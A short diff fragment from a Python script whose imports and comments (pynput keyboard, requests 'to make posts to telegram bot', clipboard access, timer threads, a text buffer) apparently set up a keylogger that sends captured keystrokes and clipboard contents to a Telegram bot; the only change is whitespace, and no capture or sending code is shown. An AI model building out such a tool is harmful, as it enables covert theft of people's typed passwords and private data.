@@ -2,7 +2,7 @@ from pynput import keyboard # for controlling the keyboard
 import requests # to make posts to telegram bot.
 import threading # to spawn timer threads
 import win32clipboard # pip install pywin32 (win32clipboard is a part of pywin32)
-
+ 
 TEXT_CONTAINER = ""
 
 
